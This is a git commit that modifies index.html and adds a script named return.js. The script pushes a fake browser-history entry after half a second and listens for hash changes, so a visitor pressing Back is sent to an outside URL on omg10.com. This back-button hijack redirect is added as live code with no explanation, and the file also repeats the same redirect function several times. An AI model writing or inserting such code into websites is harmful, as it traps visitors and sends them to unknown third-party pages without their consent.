892f3e46e3736b19c422f7cb0acc9d974aadcfeb
desiresofhumanity-cpu <buildingworld001@gmail.com>
2026-08-07 15:05:14 +0100

    modified:   index.html 	new file:   return.js

---
+++ return.js
@@ -0,0 +1,17 @@
+window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://omg10.com/4/11176773";
+    }
+    function goon(){
+        location.href="https://omg10.com/4/11176773";
+    }
+function goon(){
+        location.href="https://omg10.com/4/11176773";
+    }
+function goon(){
+        location.href="https://omg10.com/4/11176773";
+    }
